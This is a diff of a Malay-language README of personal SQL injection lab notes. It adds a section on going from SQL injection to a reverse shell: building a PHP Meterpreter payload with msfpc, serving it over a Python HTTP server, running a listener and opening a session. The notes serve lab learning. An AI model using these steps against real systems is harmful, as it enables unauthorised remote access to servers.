@@ -1,4 +1,4 @@
-# SQL Injection Training Lab notes
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/53901f93-1665-4cb6-804b-23ddc0d00d44)# SQL Injection Training Lab notes
 SQL Injection Training Lab notes for me (Malay Language) 
 
 :warning: **Only for Educational Purpose.**
@@ -256,5 +256,38 @@ SQL Injection Training Lab notes for me (Malay Language)
 - Untuk test RCE,buka tab baru pergi ke path file yang telah dicreate sebelum ini. Gambar di bawah contoh menggunakan cmd `Whoami`. Boleh cuba pelbagai cmd yang lain.
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/bc238473-ab02-46f0-a5cb-0801c6ca9f80)
+
+- Done!
+
+## Level M - SQLi to Reverse Shell
+
+- Ini adalah basic Reverse Shell menggunakan `msfpc` == `MSFvenom Payload Creator`.
+- Mula-mula create Payload menggunakan msfpc dalam Kali Linux, cmd `msfpc php <my ip address> <my port>`, contoh dibawah menggunakan IP Address Kali Linux.
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/e4f1145f-798c-4e12-a4e2-12940d27f480)
+
+- Contoh Payload PHP yang sudah di create gambar dibawah.
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5fce25f5-578a-43b3-ad43-015a2cce6d39)
+
+- Kemudian hantar Payload PHP tadi ke Target Server sbg contoh saya hantar ke PC saya sahaja, ada beberapa cara untuk hantar, saya menggunakan Python Web Server dengan cmd ini `python3 -m http.server 8080`
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5eb27483-1a6a-4b13-a194-4a0b9d0d3258)
+
+- Sebagai contoh saya menggunakan PC saya sendiri sahaja. So untuk access file yang dihantar tadi, buka Browser dan taip URL Ip Address Python Web Server berserta Port, contoh gambar dibawah. Kemudian click file .php untuk download sahaja.
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/37cee2f0-311c-434e-8fa0-71148868f56a)
+
+- Selepas itu, jangan lupa untuk run Listener, contoh cmd boleh refer msfpc create tadi
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/a90a9a7d-2ae5-4bd6-bc06-7520ee6d1500)
+
+- Seterusnya run sahaja PHP Payload, munggunakan Terminal cmd `php <Payload.php>`
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/0cacf279-8fcb-4705-98f4-000ff11cb65f)
+
+- Kemudian Reverse Connection berlaku, untuk melihat jenis-jenis cmd Meterpreter boleh taip `help`,terdapat banyak cmd yang ada, saya just tunjuk `sysinfo` sahaja.
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/0eb022d5-6860-48ed-a2e2-6b503495ec19)
 
 - Done!
